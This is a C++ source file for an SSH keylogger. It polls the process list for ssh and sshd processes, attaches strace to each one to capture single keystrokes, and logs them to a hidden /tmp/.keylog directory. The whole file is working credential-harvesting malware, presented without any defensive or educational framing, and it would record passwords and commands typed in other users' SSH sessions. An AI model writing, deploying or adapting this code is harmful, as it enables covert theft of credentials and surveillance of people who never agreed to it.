#include <iostream>
#include <experimental/filesystem>
#include <cstring>
#include <thread>
#include <algorithm>
#include <fcntl.h>
#include <boost/regex.hpp>
#include <boost/filesystem.hpp>


namespace fs = boost::filesystem;


class Process{
public:
    Process(std::string user, uint16_t pid, std::string cmd, std::string args):
    _user(user), _pid(pid), _cmd(cmd), _args(args){};

    bool find_sshd() const {
        if (_args.find("pts") != std::string::npos){
            std::cout << "Incoming ssh connection: PID = " << _pid << std::endl;
            return true;
        } else return false;
    }

    bool find_ssh() const {
        if (_cmd.find("ssh") != std::string::npos){
            std::cout << "Outgoing ssh connection: PID = " << _pid << std::endl;
            return true;
        } else return false;
    }

    uint16_t get_pid() const {
        return _pid;
    }

private:
    std::string _user;
    uint16_t _pid;
    std::string _cmd;
    std::string _args;
};

void split_string(const std::string &s, char delim, std::vector<std::string> &elems) {
    std::stringstream ss(s);
    std::string item;
    while (std::getline(ss, item, delim)) {
        if (item.length() > 0) {
            elems.push_back(item);
        }
    }
}

std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(const std::string& proc_info){
    std::vector<std::string> elems = {};
    char delim[] = " ";
    split_string(proc_info, delim[0], elems);
    std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = std::make_tuple(elems[0],
            std::stoi(elems[1]), elems[10], elems[11]);
    return splitted_proc_info;
}

std::string parse_strace_output(std::string& output, boost::regex& xRegEx){
    boost::smatch xResults{};
    boost::regex_search(output, xResults, xRegEx);
    if(!xResults.empty()){
        std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
        std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
        if(xResults["cmd"] == 0x0D) return "[ENTER]";
        else if(xResults["cmd"] == "\177") return "[BACKSPACE]";
        else if(xResults["cmd"] == "\3") return "[Ctrl+C]";
        else if(xResults["cmd"] == "\4") return "[Ctrl+D]";
        else if(xResults["cmd"] == "\27") return "\\w";
        else return xResults["cmd"];
    }
    std::cout << "CMD: EMPTY" << std::endl;
    return "EMPTY!";
}

std::vector<Process> get_proc_list_of_ssh(){
    std::string command("ps -auxw");
    std::array<char, 128> buffer{};
    std::vector<Process> proc_list{};

    std::cout << "Opening reading PIPE from ps process output" << std::endl;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'ps -auxw' command" << std::endl;
        return {};
    }
    fgets(buffer.data(), 128, pipe);
    while (fgets(buffer.data(), 128, pipe) != nullptr) {
        std::string proc_info{buffer.data()};
        if(proc_info.find("ssh") != std::string::npos){
            std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = split_proc_info(proc_info);
            proc_list.emplace_back(Process{std::get<0>(splitted_proc_info),
                                   std::get<1>(splitted_proc_info),
                                   std::get<2>(splitted_proc_info),
                                   std::get<3>(splitted_proc_info)});
        }
    }
    auto returnCode = pclose(pipe);
    std::cout << "Closing PIPE return code: " << returnCode << std::endl;
    return proc_list;
}

void ssh_keylogger(const uint16_t& pid){
    std::cout << "Handling process(outgoing SSH) " << pid << " by keylogger" << std::endl;
    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
    FILE* pipe = popen(strace_cmd.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'strace' command" << std::endl;
        return;
    }
    fs::path log_filename = "/tmp/.keylog";
    log_filename /= std::to_string(pid) + "_ssh.log";
    FILE *fd = std::fopen(log_filename.c_str(), "a+");
    if(!fd){
        std::cout << "Log-file error: " << log_filename << std::endl;
        return;
    }
    std::array<char, 256> buffer{};
    while(fgets(buffer.data(), 256, pipe) != nullptr){
//        std::cout << "BUFFER_SSH: " << buffer.data() << std::endl;
        std::string data_from_strace{buffer.data()};
        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                data_from_strace.find("= 1\n") != std::string::npos){
            std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= ");
            std::string symbol = parse_strace_output(data_from_strace, xRegEx);
            std::cout << "SYMBOL: " << symbol << std::endl;
            std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
        } else {
            continue;
        }
    }
    pclose(pipe);
    std::fclose(fd);
}

void sshd_keylogger(const uint16_t& pid){
    std::cout << "Handling process(incoming SSH) " << pid << " by keylogger" << std::endl;
    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
    FILE* pipe = popen(strace_cmd.c_str(), "r");
    if (!pipe)
    {
        std::cout << "Couldn't 'strace' command" << std::endl;
        return;
    }
    fs::path log_filename = "/tmp/.keylog";
    log_filename /= std::to_string(pid) + "_sshd(inc).log";
    FILE *fd = std::fopen(log_filename.c_str(), "a+");
    if(!fd){
        std::cout << "Log-file error: " << log_filename << std::endl;
        return;
    }
    std::array<char, 256> buffer{};
    while(fgets(buffer.data(), 256, pipe) != nullptr){
//        std::cout << "BUFFER_SSHD: " << buffer.data() << std::endl;
        std::string data_from_strace{buffer.data()};
        if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                data_from_strace.find("= 1\n") != std::string::npos){
            std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
            std::string symbol = parse_strace_output(data_from_strace, xRegEx);
            std::cout << "SYMBOL: " << symbol << std::endl;
            std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
        } else {
            continue;
        }
    }
    pclose(pipe);
    std::fclose(fd);
}

void check_ps(std::vector<uint16_t>& procs_in_monitoring){
    std::vector<Process> proc_list = get_proc_list_of_ssh();
    for (auto &proc : proc_list){
        if (proc.find_sshd()){
            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
            if(it == procs_in_monitoring.end()){
                procs_in_monitoring.emplace_back(proc.get_pid());
                std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
                sshd_keylog.detach();
            }
        }
        else if(proc.find_ssh()){
            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
            if(it == procs_in_monitoring.end()){
                procs_in_monitoring.emplace_back(proc.get_pid());
                std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
                ssh_keylog.detach();
            }
        }
    }
}

int main() {
    const fs::path path_to_log = "/tmp/.keylog";
    int64_t sleep_time = 10;
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        std::cout << "DIR is created" << std::endl;
    }

//    std::string output = "write(9, \"\177\", 1)                       = 1";
//    boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
//    boost::smatch xResults{};
//    boost::regex_search(output, xResults, xRegEx);
//    if(!xResults.empty()){
//        std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
//        std::cout << xResults.size() << std::endl;
//        std::cout << "FOUND_CMD: " << xResults[1] << std::endl;
//        std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
//        if(xResults["cmd"] == "\177"){
//            std::cout << "RETURN" << std::endl;
//        }
//    }


    std::vector<uint16_t> procs_in_monitoring{};
    while(true){
        check_ps(procs_in_monitoring);
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}